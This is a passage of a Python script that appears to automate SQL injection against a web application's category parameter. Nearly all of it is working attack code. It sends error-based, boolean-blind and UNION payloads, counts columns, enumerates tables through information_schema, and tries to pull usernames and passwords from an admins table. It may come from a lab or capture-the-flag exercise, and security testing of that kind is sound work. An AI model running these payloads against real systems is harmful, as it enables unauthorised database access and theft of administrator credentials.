print(f"[+] Session: PHPSESSID=a619c2d322b0d2025997d9751eb6d09a")

# Baseline response
r_base = session.get(f"{target}?category=Nature")
baseline_len = len(r_base.text)
print(f"\n[+] Baseline response: {baseline_len} bytes")

# Test 1: Error-based SQL injection
print("\n[+] Testing error-based payloads:")
error_payloads = ["'", '"', "' OR '1'='1", "' OR 1=1--", "' UNION SELECT 1--"]
for payload in error_payloads:
    encoded = urllib.parse.quote(payload)
    r = session.get(f"{target}?category={encoded}")
    print(f"[+] Payload: {payload:<25} | Size: {len(r.text)} bytes")
    if len(r.text) != baseline_len:
        print(f"[!] Response size differs - may indicate vulnerability")
        print(f"[!] Response snippet: {r.text[:200]}")

# Test 2: Boolean-based blind SQL injection
print("\n[+] Testing boolean-based blind injection:")
bool_true = "Nature' AND '1'='1"
bool_false = "Nature' AND '1'='2"

r_true = session.get(f"{target}?category={urllib.parse.quote(bool_true)}")
r_false = session.get(f"{target}?category={urllib.parse.quote(bool_false)}")

print(f"[+] True condition: {len(r_true.text)} bytes")
print(f"[+] False condition: {len(r_false.text)} bytes")

if len(r_true.text) != len(r_false.text):
    print("[!] Boolean-based blind SQL injection CONFIRMED - response sizes differ")
    blind_sqli_possible = True
else:
    print("[-] No difference in response sizes for boolean test")
    blind_sqli_possible = False

# Test 3: UNION-based injection - find column count
print("\n[+] Testing UNION-based injection:")
for columns in range(1, 8):
    union_payload = f"' UNION SELECT " + ",".join([str(i) for i in range(1, columns+1)]) + "--"
    encoded = urllib.parse.quote(union_payload)
    r = session.get(f"{target}?category={encoded}")
    print(f"[+] Columns={columns}: {len(r.text)} bytes")
    if len(r.text) > baseline_len + 50:
        print(f"[!] Significantly different response size detected!")
        print(f"[!] Full response:\n{r.text}")
        break

# Test 4: Extract from admins table
print("\n[+] Attempting to extract data from admins table:")
table_payloads = [
    "' UNION SELECT 1,2,3,4,5 FROM admins--",
    "' UNION SELECT username,password FROM admins LIMIT 1--",
    "' UNION SELECT admin_user,admin_pass FROM admins LIMIT 1--",
    "' UNION SELECT user,pass FROM admins LIMIT 1--",
    "' UNION SELECT null,username,password,null,null FROM admins LIMIT 1--"
]

for payload in table_payloads:
    encoded = urllib.parse.quote(payload)
    r = session.get(f"{target}?category={encoded}")
    print(f"[+] Payload: {payload}")
    print(f"[+] Response size: {len(r.text)} bytes")
    if "Category does not exist" not in r.text and len(r.text) != baseline_len:
        print(f"[!] Different response detected!")
        print(f"[!] Full response:\n{r.text}")
        # Extract any credentials shown
        if "admin" in r.text.lower():
            print(f"[!] Potential admin data found in response")

# Test 5: Information schema enumeration
print("\n[+] Enumerating database structure:")
schema_payload = "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()--"
r = session.get(f"{target}?category={urllib.parse.quote(schema_payload)}")
if len(r.text) != baseline_len:
    print(f"[!] Tables enumerated - response size: {len(r.text)} bytes")
    print(f"[!] Response:\n{r.text}")

print("\n[+] SQL injection testing complete")
